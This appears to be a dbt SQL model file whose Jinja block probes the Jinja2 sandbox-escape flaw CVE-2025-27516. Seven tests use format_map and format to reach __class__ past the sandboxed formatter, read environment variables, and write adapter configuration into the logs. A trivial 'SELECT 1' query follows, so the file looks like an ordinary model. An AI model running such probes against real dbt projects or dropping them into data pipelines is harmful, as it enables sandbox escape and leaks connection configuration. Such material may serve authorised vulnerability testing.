{# Final CVE-2025-27516 format_map test #}

{# T1: format_map with __class__ via dict #}
{% set fm = ''|attr('format_map') %}
{{ log("T1_FM=" ~ (fm | string), info=True) }}

{# T2: Call format_map — does it bypass SandboxedFormatter? #}
{% set fm2 = '{self.__class__}'|attr('format_map') %}
{% set r2 = fm2({'self': ''}) %}
{{ log("T2_FM_CLASS=" ~ r2, info=True) }}

{# T3: Jinja2 version from env #}
{% set env_keys = [] %}
{% for key in ['jinja2', 'JINJA2_VERSION', 'jinja_version'] %}
  {{ log("T3_ENV_" ~ key ~ "=" ~ env_var(key, 'NOT_SET'), info=True) }}
{% endfor %}

{# T4: Try to access module paths via format #}
{% set f4 = '{0.pattern}'|attr('format') %}
{% set pat = modules.re.compile('test') %}
{{ log("T4_PAT_STR=" ~ (pat | string), info=True) }}

{# T5: Probe adapter.config dict-style access #}
{% set f5 = '{0[project_name]}'|attr('format') %}
{{ log("T5_PROJECT=" ~ f5(adapter.config), info=True) }}

{# T6: Try adapter connections via format #}
{% set f6 = '{0.config}'|attr('format') %}
{{ log("T6_ADAPTER_CONFIG=" ~ (f6(adapter) | string)[:200], info=True) }}

{# T7: Check if we can use __getattr__ through item access #}
{% set test_dict = {'__class__': 'pwned', '__globals__': 'pwned2'} %}
{% set f7 = '{0[__class__]}'|attr('format') %}
{{ log("T7_DICT_ITEM=" ~ f7(test_dict), info=True) }}

SELECT 1 as id
